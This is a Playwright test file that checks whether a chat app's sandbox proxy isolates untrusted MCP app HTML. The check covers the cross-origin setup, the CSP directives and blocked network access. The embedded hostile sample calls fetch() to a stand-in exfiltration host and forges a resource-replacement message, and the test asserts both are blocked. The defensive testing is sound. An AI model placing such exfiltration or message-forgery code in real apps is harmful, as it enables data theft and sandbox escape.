import { expect, test } from '@playwright/test';

test('isolates untrusted app HTML behind a cross-origin proxy', async ({
  page,
}) => {
  await page.goto('/chat/mcp-apps');

  const exfiltrationRequests: string[] = [];
  page.on('request', request => {
    if (request.url().startsWith('https://exfil.example/')) {
      exfiltrationRequests.push(request.url());
    }
  });

  const proxyUrl = new URL(
    '/chat/mcp-apps/sandbox',
    page.url().replace('localhost', '127.0.0.1'),
  ).toString();
  const proxyOrigin = new URL(proxyUrl).origin;
  const appHtml = `<!doctype html>
    <html>
      <head><title>Untrusted MCP App</title></head>
      <body>
        <script>
          const notify = (method, params) => parent.postMessage({
            jsonrpc: '2.0',
            method,
            params,
          }, '*');

          notify('test/probe', {
            origin: location.origin,
            csp: document.querySelector(
              'meta[http-equiv="Content-Security-Policy"]'
            )?.content,
          });
          notify('ui/notifications/sandbox-resource-ready', {
            html: '<h1>forged replacement</h1>',
          });

          fetch('https://exfil.example/secret')
            .then(() => notify('test/fetch-succeeded'))
            .catch(() => notify('test/fetch-blocked'));
        </script>
      </body>
    </html>`;

  const messages = await page.evaluate(
    ({ appHtml, proxyOrigin, proxyUrl }) =>
      new Promise<Array<{ data: unknown; origin: string }>>(
        (resolve, reject) => {
          const iframe = document.createElement('iframe');
          iframe.sandbox.add(
            'allow-scripts',
            'allow-same-origin',
            'allow-forms',
          );

          const received: Array<{ data: unknown; origin: string }> = [];
          const timeout = window.setTimeout(() => {
            cleanup();
            reject(new Error('Timed out waiting for sandbox messages'));
          }, 10_000);

          const cleanup = () => {
            window.clearTimeout(timeout);
            window.removeEventListener('message', onMessage);
            iframe.remove();
          };

          const onMessage = (event: MessageEvent) => {
            if (
              event.source !== iframe.contentWindow ||
              event.origin !== proxyOrigin
            ) {
              return;
            }

            received.push({ data: event.data, origin: event.origin });

            if (event.data?.method === 'ui/notifications/sandbox-proxy-ready') {
              iframe.contentWindow?.postMessage(
                {
                  jsonrpc: '2.0',
                  method: 'ui/notifications/sandbox-resource-ready',
                  params: {
                    html: appHtml,
                    sandbox: 'allow-scripts allow-forms',
                  },
                },
                proxyOrigin,
              );
            }

            if (event.data?.method === 'test/fetch-blocked') {
              window.setTimeout(() => {
                cleanup();
                resolve(received);
              }, 100);
            }
          };

          window.addEventListener('message', onMessage);
          iframe.src = proxyUrl;
          document.body.appendChild(iframe);
        },
      ),
    { appHtml, proxyOrigin, proxyUrl },
  );

  expect(proxyOrigin).not.toBe(new URL(page.url()).origin);
  expect(messages.every(message => message.origin === proxyOrigin)).toBe(true);

  const probe = messages.find(
    message => (message.data as { method?: string })?.method === 'test/probe',
  )?.data as
    | { params?: { origin?: string; csp?: string }; method?: string }
    | undefined;

  expect(probe?.params?.origin).toBe('null');
  expect(probe?.params?.csp).toContain("connect-src 'none'");
  expect(probe?.params?.csp).toContain("object-src 'none'");
  expect(probe?.params?.csp).toContain("frame-src 'none'");
  expect(
    messages.some(
      message =>
        (message.data as { method?: string })?.method ===
        'ui/notifications/sandbox-resource-ready',
    ),
  ).toBe(false);
  expect(
    messages.some(
      message =>
        (message.data as { method?: string })?.method ===
        'test/fetch-succeeded',
    ),
  ).toBe(false);
  expect(exfiltrationRequests).toEqual([]);
});
